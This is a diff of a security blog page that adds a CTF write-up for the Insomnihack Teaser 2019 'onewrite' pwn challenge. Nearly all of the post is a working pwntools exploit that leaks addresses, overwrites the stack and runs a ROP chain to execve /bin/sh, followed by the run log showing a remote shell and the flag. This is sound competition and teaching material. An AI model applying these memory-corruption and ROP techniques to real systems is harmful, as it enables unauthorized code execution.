@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="en-us">
 
@@ -6,15 +7,28 @@
     <meta charset="utf-8" />
     <meta http-equiv="X-UA-Compatible" content="IE=edge" />
     <meta name="google-site-verification" content="YvLRi76QLISdw5rag4dXqmRRYvw91no7guPZf0-a6FY" />
-    <meta property="og:title" content=" Pwn &middot;  Protego Totalum Security" />
+    <meta property="og:title" content=" Insomnihack Teaser CTF 2019 &middot;  Protego Totalum Security" />
     <meta property="og:site_name" content="Protego Totalum Security" />
-    <meta property="og:url" content="https://protegototalum.faith/tags/pwn/" />
+    <meta property="og:url" content="https://protegototalum.faith/post/insomnihack-teaser-ctf-2019/" />
 
     
-    <meta property="og:type" content="website" />
+    <meta property="og:type" content="article" />
+    <meta property="og:article:published_time" content="2019-01-20T19:21:38-05:00" />
+    <meta property="og:article:tag" content="Insomnihack-CTF" />
+    <meta property="og:article:tag" content="CTF" />
+    <meta property="og:article:tag" content="pwn" />
     
 
-    <title> Pwn &middot;  Protego Totalum Security</title>
+    <meta name="twitter:card" content="summary" />
+    <meta name="twitter:site" content="@flyingpassword" />
+    <meta name="twitter:creator" content="@flyingpassword" />
+    <meta name="twitter:title" content="Insomnihack Teaser CTF 2019" />
+    
+    <meta name="twitter:description" content="Onewrite - Pwn from __future__ import print_function from pwn import * import os GDBSCRIPT = &quot;&quot;&quot; &quot;&quot;&quot; HOST = &#39;onewrite.teaser.insomnihack.ch&#39; PORT = 1337 BIN = &#39;./onewrite&#39; PROMPT = &quot;&gt; &quot; STACK = &quot;1&quot; PIE = &quot;2&quot; ADDR = &quot;address : &quot; DATA = &quot;data : &quot; e = ELF(BIN) addrs = { &#39;poprax&#39;: 0x460ac, &#39;poprdxrsi&#39;: 0x484e9, &#39;poprdi&#39;: 0x84fa, &#39;syscall&#39;: 0x6e605, &#39;poprsp&#39;: 0x946a } if os.environ.has_key(&#39;remote&#39;): r = remote(HOST, PORT) else: r = process(e." />
+    <meta name="twitter:url" content="https://protegototalum.faith/post/insomnihack-teaser-ctf-2019/" />
+    
+
+    <title> Insomnihack Teaser CTF 2019 &middot;  Protego Totalum Security</title>
 
     <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" />
     <link rel="preload" href="/js/main.js" as="script" />
@@ -43,10 +57,55 @@
     
 
     
-    <link href="https://protegototalum.faith/tags/pwn/index.xml" rel="alternate" type="application/rss+xml" title="Pwn &middot; Protego Totalum Security" />
-    
-    <link rel="canonical" href="https://protegototalum.faith/tags/pwn/" />
+    <link rel="canonical" href="https://protegototalum.faith/post/insomnihack-teaser-ctf-2019/" />
 
+    
+    <script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "mainEntityOfPage": {
+          "@type": "WebPage",
+          "@id": "https://protegototalum.faith/post/insomnihack-teaser-ctf-2019/"
+        },
+        "headline": "Insomnihack Teaser CTF 2019",
+        "description": "",
+        "author": {
+            "@type": "Person",
+            "name": "Duc Phan",
+            "url": "http://profiles.google.com/?rel=author",
+            "image": {
+              "@type": "ImageObject",
+              "url": "https:",
+              "height": 80,
+              "width": 80
+            }
+        },
+        "publisher": {
+          "@type": "Organization",
+          "@id": "https://protegototalum.faith/",
+          "name": "Protego Totalum Security",
+          "url": "https://protegototalum.faith/",
+          "logo": {
+            "@type": "ImageObject",
+            "url": "https:",
+            "height": 80,
+            "width": 80
+          }
+        },
+        
+        "image": {
+          "@type": "ImageObject",
+          "url": "",
+          "height": 80,
+          "width": 80
+        },
+        "datePublished": "2019-01-20",
+        "dateModified": "2019-01-20",
+        "wordCount": 1004,
+        "keywords": ["Insomnihack-CTF","CTF","pwn"] 
+    }
+    </script>
     
 
     
@@ -54,9 +113,9 @@
         
         
         var disqus_shortname = 'asimpleguy';
-        var disqus_identifier = 'https:\/\/protegototalum.faith\/tags\/pwn\/';
-        var disqus_title = 'Pwn';
-        var disqus_url = 'https:\/\/protegototalum.faith\/tags\/pwn\/';
+        var disqus_identifier = 'https:\/\/protegototalum.faith\/post\/insomnihack-teaser-ctf-2019\/';
+        var disqus_title = 'Insomnihack Teaser CTF 2019';
+        var disqus_url = 'https:\/\/protegototalum.faith\/post\/insomnihack-teaser-ctf-2019\/';
         
     </script>
     
@@ -117,6 +176,8 @@ html{font-family:sans-serif;line-height:1.15;-ms-text-size-adjust:100%;-webkit-t
                 </form>
                 
                 
+                
+                
                 <a id="main-menu-button" class="menu" data-action="menu" data-target="menu"
                    title="Main Menu"><i class="fa fa-navicon"></i></a>
                 
@@ -124,93 +185,332 @@ html{font-family:sans-serif;line-height:1.15;-ms-text-size-adjust:100%;-webkit-t
         </nav>
 
 
-<header id="header" class="header">
-	<div class="inner">
-		<a class="header-title" href="https://protegototalum.faith/">
-			<h1 class="header-name">Pwn</h1>
-		</a>
-	</div>
-	
-</header>
+<main class="content" role="main">
+    <article class="post">
+        <div class="inner">
 
-	<div id="post-index" class="container">
+            <div id="push">
 
-		<main class="content" role="main">
+                <header class="post-header">
+                
+                    <span class="post-meta">
+                        <span class="post-date">20 Jan 2019</span> <span class="reading-time">| <span class="estimated-reading-time">5 min.</span> (<span class="word-count">1004</span> words)</span></span>
+                    </span>
+                <div class="clear"></div>
+                
+                <h1 class="post-title">Insomnihack Teaser CTF 2019</h1>
+              </header>
 
-			<div class="post-list">
-				<div id="push">
+              <section class="post-content">
+                
+                  
 
-			
+<h1 id="onewrite-pwn">Onewrite - Pwn</h1>
 
-			
-			  
-<article class="post post">
+<pre><code class="language-python">from __future__ import print_function
+from pwn import *
+import os
 
-	<div class="inner">
-		<a class="post-link" href="https://protegototalum.faith/post/insomnihack-teaser-ctf-2019/"></a>
-		
-		<span class="post-meta">
-			<span class="post-date">20 Jan 2019</span>
-		</span>
-		<h2 class="post-title"><a href="https://protegototalum.faith/post/insomnihack-teaser-ctf-2019/">Insomnihack Teaser CTF 2019</a></h2>
-		<p class="post-excerpt">Onewrite - Pwn from __future__ import print_function from pwn import * import os GDBSCRIPT = &quot;&quot;&quot; &quot;&quot;&quot; HOST = 'onewrite.teaser.insomnihack.ch' PORT = 1337 BIN = './onewrite' PROMPT = &quot;&gt; &quot; STACK = &quot;1&quot; PIE = &quot;2&quot; ADDR = &quot;address : &quot; DATA = &quot;data : &quot; e = ELF(BIN) addrs = { 'poprax': 0x460ac, 'poprdxrsi': 0x484e9, 'poprdi': 0x84fa, 'syscall': 0x6e605, 'poprsp': 0x946a } if os.environ.has_key('remote'): r = remote(HOST, PORT) else: r = process(e.</p>
-		<span class="post-more"><a href="https://protegototalum.faith/post/insomnihack-teaser-ctf-2019/">Read more <i class="fa fa-angle-right"></i></a></span>
-	</div>
-</article>
+GDBSCRIPT = &quot;&quot;&quot;
+&quot;&quot;&quot;
+HOST = 'onewrite.teaser.insomnihack.ch'
+PORT = 1337
+BIN = './onewrite'
 
-			
-			  
-<article class="post post">
+PROMPT = &quot;&gt; &quot;
+STACK = &quot;1&quot;
+PIE = &quot;2&quot;
+ADDR = &quot;address : &quot;
+DATA = &quot;data : &quot;
 
-	<div class="inner">
-		<a class="post-link" href="https://protegototalum.faith/post/tetctf-19/"></a>
-		
-		<span class="post-meta">
-			<span class="post-date">1 Jan 2019</span>
-		</span>
-		<h2 class="post-title"><a href="https://protegototalum.faith/post/tetctf-19/">TetCTF 19</a></h2>
-		<p class="post-excerpt">Web - IQTest2 (unsolved) Pwn - Easy webserver (unsolved) Pwn - Babysandbox Pwn - Babyheap Pwn - Babyfirst  Web 
-IQTest2  After looking at the source code, there is a path that we can polute the $level variable to pass. It has to pass several condition check:  if (isset($_COOKIE['saved']) &amp;&amp; !empty($_COOKIE['saved']) &amp;&amp; isset($_COOKIE['hash']) &amp;&amp; !empty($_COOKIE['hash'])) { $saved = base64_decode($_COOKIE[&quot;saved&quot;]); $seed = urldecode(substr($saved, 5 )); } if( md5($GLOBALS['secret'].</p>
-		<span class="post-more"><a href="https://protegototalum.faith/post/tetctf-19/">Read more <i class="fa fa-angle-right"></i></a></span>
-	</div>
-</article>
+e = ELF(BIN)
+addrs = {
+    'poprax': 0x460ac,
+    'poprdxrsi': 0x484e9,
+    'poprdi': 0x84fa,
+    'syscall': 0x6e605,
+    'poprsp': 0x946a
+}
 
-			
-			  
-<article class="post post">
+if os.environ.has_key('remote'):
+    r = remote(HOST, PORT)
+else:
+    r = process(e.path)
 
-	<div class="inner">
-		<a class="post-link" href="https://protegototalum.faith/post/csaw-ctf-17-qual/"></a>
-		
-		<span class="post-meta">
-			<span class="post-date">20 Sep 2017</span>
-		</span>
-		<h2 class="post-title"><a href="https://protegototalum.faith/post/csaw-ctf-17-qual/">CSAW CTF 2017 Qualification</a></h2>
-		<p class="post-excerpt">pwn: pilot (75 pts.) English version here
-Vietnamese Năm nay mình có cơ hội chơi CSAW CTF một cách thực sự, với hy vọng team đủ khỏe để vào final North America lần nữa. Qua một năm được các tiền bối thông não (quangltm và anh tuanit96), mình đã quẩy được vài bài khá cơ bản.
-Đây là bài đầu tiên mình owned trong giờ thi. Bài này là một bài buffer overflow cơ bản.</p>
-		<span class="post-more"><a href="https://protegototalum.faith/post/csaw-ctf-17-qual/">Read more <i class="fa fa-angle-right"></i></a></span>
-	</div>
-</article>
+if os.environ.has_key('debug'):
+    gdb.attach(r, gdbscript=GDBSCRIPT)
 
-			
+def overwrite(addr, data, prompt=True):
+    r.recvuntil(ADDR)
+    r.send(str(addr))
+    r.recvuntil(DATA)
+    r.send(data)
+    if prompt:
+        r.recvuntil(PROMPT)
+        r.sendline(&quot;&quot;)
 
-				</div>
-			</div>
+def main():
+    # Leak stack and return to do_leak
+    r.recvuntil(PROMPT)
+    r.sendline(STACK)
+    stackleak = int(r.recvuntil(&quot;\n&quot;), 16)
+    print(&quot;stack @ {:#08x}&quot;.format(stackleak))
 
-			<nav id="pagination" class="pagination" role="pagination">
-	<div class="inner">
-	
-		<span class="pagination-info">Page 1 of 1</span>
-	
-		<div class="clear"></div>
-	</div>
-</nav>
+    overwrite(stackleak - 0x8, '\x15', prompt=False)
+
+    # Leak binary
+    r.recvuntil(PROMPT)
+    r.sendline(PIE)
+    binleak = int(r.recvuntil(&quot;\n&quot;), 16)
+    binbase = binleak - e.symbols['do_leak']
+    # Rebase after leak
+    for k in addrs.keys():
+        addrs[k] += binbase
+    print(&quot;do_leak @ {:#08x}&quot;.format(binleak))
+    print(&quot;binbase @ {:#08x}&quot;.format(binbase))
+
+    # Then keep overwriting it with do_leak
+    # At some point, we need to overwrite that 0 too
+    # Then do_leak will be called consecutively
+    
+    # Overwrite first time
+    nOverwrite = 9
+    writeaddr = stackleak - 0x8
+    for i in range(nOverwrite):
+        log.info(&quot;Overwriting {}&quot;.format(i))
+        writeaddr -= 0x18
+        overwrite(writeaddr, p64(binleak))
+
+    writeaddr += 0x8
+    for i in range(nOverwrite - 2):
+        log.info(&quot;Overwriting reverse {}&quot;.format(i))
+        overwrite(writeaddr, p64(binleak))
+        writeaddr += 0x18    
+
+    # ropchain
+    # pop rsp
+    # ropchain address
+
+    # x          : /bin/sh
+    # x + 0x08   : 0
+
+    # pop rax
+    # 59
+    # pop rdx; pop rsi
+    # 0
+    # 0
+    # pop rdi
+    # x
+    # syscall
+
+    ropaddr = stackleak + 0x30
+    overwrite(writeaddr, p64(addrs['poprsp']))
+    overwrite(writeaddr + 0x8, p64(ropaddr))
+
+    binshaddr = stackleak + 0x10
+    overwrite(binshaddr, &quot;/bin/sh\x00&quot;)
+    overwrite(binshaddr + 0x08, p64(0))
+    log.info(&quot;Write arguments done&quot;)
+
+    ropchain = p64(addrs['poprax'])
+    ropchain += p64(59)
+    ropchain += p64(addrs['poprdxrsi'])
+    ropchain += p64(0)
+    ropchain += p64(0)
+    ropchain += p64(addrs['poprdi'])
+    ropchain += p64(binshaddr)
+    ropchain += p64(addrs['syscall'])
+    ropchain += p64(binleak)
+
+    for i in range(0, 9):
+        overwrite(ropaddr + i * 8, ropchain[i * 8 : (i + 1) * 8])
+    log.info(&quot;Write ropchain done&quot;)
+    for _ in range(4):
+        r.recvuntil(&quot; : &quot;)
+        r.sendline(&quot;&quot;)
+    
+    r.interactive()
+    r.close()
+
+if __name__ == '__main__':
+    main()
 
 
-		</main>
+# 1 -&gt; 2 before 0
+# 2 -&gt; 4 before 0 the second time
 
-	</div>
+# 0x7fffffffdf08
+# 0x7fffffffdef0 0x7fffffffdef8
+# 0x7fffffffded8 0x7fffffffdee0
+# 0x7fffffffdec0 0x7fffffffdec8
+# 0x7fffffffdea8 0x7fffffffdeb0
+# 0x7fffffffde90 0x7fffffffde98
+</code></pre>
+
+<pre><code class="language-bash">➜  insonimhack remote=1 python exploit.py
+[!] Did not find any GOT entries
+[*] '/home/me/tmp/insonimhack/onewrite'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[+] Opening connection to onewrite.teaser.insomnihack.ch on port 1337: Done
+stack @ 0x7fff4b937ca0
+{'poprdxrsi': 140562253915369, 'syscall': 140562254071301, 'poprsp': 140562253657194, 'poprax': 140562253906092, 'poprdi': 140562253653242}
+do_leak @ 0x7fd73332aa15
+binbase @ 0x7fd733322000
+[*] Overwriting 0
+[*] Overwriting 1
+[*] Overwriting 2
+[*] Overwriting 3
+[*] Overwriting 4
+[*] Overwriting 5
+[*] Overwriting 6
+[*] Overwriting 7
+[*] Overwriting 8
+[*] Overwriting 9
+[*] Overwriting reverse 0
+[*] Overwriting reverse 1
+[*] Overwriting reverse 2
+[*] Overwriting reverse 3
+[*] Overwriting reverse 4
+[*] Overwriting reverse 5
+[*] Overwriting reverse 6
+[*] Overwriting reverse 7
+[*] Write arguments done
+[*] Write ropchain done
+0x7fd733390605
+What do you want to leak ?
+1. stack
+2. pie
+ &gt; Nope
+address : $ 
+data : $ 
+What do you want to leak ?
+1. stack
+2. pie
+ &gt; Nope
+address : $ 
+data : $ 
+$ ls -la
+total 96
+drwxr-xr-x  23 root root  4096 Jan 19 11:01 .
+drwxr-xr-x  23 root root  4096 Jan 19 11:01 ..
+drwxr-xr-x   2 root root  4096 Jan 19 10:59 bin
+drwxr-xr-x   4 root root  4096 Jan 19 11:00 boot
+drwxr-xr-x  16 root root  3620 Jan 19 11:01 dev
+drwxr-xr-x  95 root root  4096 Jan 19 11:55 etc
+drwxr-xr-x  14 root root  4096 Jan 19 11:55 home
+lrwxrwxrwx   1 root root    31 Dec 22 16:30 initrd.img -&gt; boot/initrd.img-4.15.0-1026-gcp
+lrwxrwxrwx   1 root root    31 Dec 22 16:30 initrd.img.old -&gt; boot/initrd.img-4.15.0-1026-gcp
+drwxr-xr-x  20 root root  4096 Dec 22 16:29 lib
+drwxr-xr-x   2 root root  4096 Dec 22 15:52 lib64
+drwx------   2 root root 16384 Dec 22 16:09 lost+found
+drwxr-xr-x   2 root root  4096 Dec 22 15:52 media
+drwxr-xr-x   2 root root  4096 Dec 22 15:52 mnt
+drwxr-xr-x   2 root root  4096 Dec 22 15:52 opt
+dr-xr-xr-x 105 root root     0 Jan 19 11:01 proc
+drwx------   4 root root  4096 Jan 19 11:45 root
+drwxr-xr-x  25 root root   960 Jan 20 06:45 run
+drwxr-xr-x   2 root root 12288 Jan 19 10:59 sbin
+drwxr-xr-x   5 root root  4096 Jan 19 10:49 snap
+drwxr-xr-x   2 root root  4096 Dec 22 15:52 srv
+dr-xr-xr-x  13 root root     0 Jan 19 11:04 sys
+drwxrwxrwt  10 root root  4096 Jan 20 23:35 tmp
+drwxr-xr-x  10 root root  4096 Dec 22 15:52 usr
+drwxr-xr-x  13 root root  4096 Dec 22 15:59 var
+lrwxrwxrwx   1 root root    28 Dec 22 16:30 vmlinuz -&gt; boot/vmlinuz-4.15.0-1026-gcp
+lrwxrwxrwx   1 root root    28 Dec 22 16:30 vmlinuz.old -&gt; boot/vmlinuz-4.15.0-1026-gcp
+$ cd /home
+$ ls -la
+total 56
+drwxr-xr-x 14 root      root      4096 Jan 19 11:55 .
+drwxr-xr-x 23 root      root      4096 Jan 19 11:01 ..
+drwxr-x---  3 awe       awe       4096 Jan 19 10:48 awe
+drwxr-x---  3 blaklis   blaklis   4096 Jan 19 10:48 blaklis
+drwxr-x---  3 boogy     boogy     4096 Jan 19 10:48 boogy
+drwxr-x---  3 coolz0r   coolz0r   4096 Jan 19 10:48 coolz0r
+drwxr-xr-x  3 daniel    daniel    4096 Jan 19 11:55 daniel
+drwxr-x---  3 drp3ab0dy drp3ab0dy 4096 Jan 19 10:48 drp3ab0dy
+drwxr-x---  3 eboda     eboda     4096 Jan 19 10:48 eboda
+drwxr-x---  5 grimmlin  grimmlin  4096 Jan 19 11:00 grimmlin
+drwxr-xr-x  2 root      root      4096 Jan 19 10:56 onewrite
+drwxr-x---  3 thomas    thomas    4096 Jan 19 10:48 thomas
+drwxr-x---  3 ubuntu    ubuntu    4096 Jan 19 10:48 ubuntu
+drwxr-x---  3 vlad      vlad      4096 Jan 19 10:48 vlad
+$ cd onewrite
+$ ls -la
+total 1004
+drwxr-xr-x  2 root root    4096 Jan 19 10:56 .
+drwxr-xr-x 14 root root    4096 Jan 19 11:55 ..
+-rw-r--r--  1 root root     220 Apr  4  2018 .bash_logout
+-rw-r--r--  1 root root    3771 Apr  4  2018 .bashrc
+-rw-r--r--  1 root root     807 Apr  4  2018 .profile
+-rw-r--r--  1 root root      48 Jan 19 10:56 flag
+-rwxr-xr-x  1 root root 1000800 Jan 19 10:56 onewrite
+$ cat flag
+INS{one leak, one write, many possibilities...}
+$  
+</code></pre>
+
+              </section>
+
+              <footer class="post-footer">
+                  <div class="post-tags">
+            
+            
+                <a href="https://protegototalum.faith/tags/insomnihack-ctf/">Insomnihack-CTF</a>
+            
+                <a href="https://protegototalum.faith/tags/ctf/">CTF</a>
+            
+                <a href="https://protegototalum.faith/tags/pwn/">pwn</a>
+            
+            
+                  </div>
+                
+                    <div class="post-share">
+                        <a class="fa fa-reddit-alien" href="//www.reddit.com/submit" onclick="window.location = '//www.reddit.com/submit?url=' + encodeURIComponent(window.location); return false">
+                            <span>Reddit</span>
+                        </a>
+                        <a class="fa fa-twitter" href="https://twitter.com/share?text=Insomnihack%20Teaser%20CTF%202019&url=https%3a%2f%2fprotegototalum.faith%2fpost%2finsomnihack-teaser-ctf-2019%2f" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                            <span>Twitter</span>
+                        </a>
+                    </div>
+            
+              </footer>
+
+            
+                <aside class="post-comments">
+    
+    
+    <div id="disqus_thread"></div>
+    <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    
+    
+</aside>
+
+            
+            </div>
+
+            <nav class="post-nav">
+                
+                
+                    <a class="post-nav-item post-nav-prev" href="https://protegototalum.faith/post/tetctf-19/">
+                        <section class="post-nav-teaser">
+                            <span class="post-nav-icon"><i class="fa fa-chevron-right"></i></span>
+                            <span class="post-nav-info">
+                                <h4 class="post-nav-title">TetCTF 19</h4>
+                            </span>
+                        </section>
+                    </a>
+                
+                <div class="clear"></div>
+            </nav>
+
+        </div>
+    </article>
+</main>
 
                 <div id="body-class" style="display: none;"></div>
                 <footer id="footer">
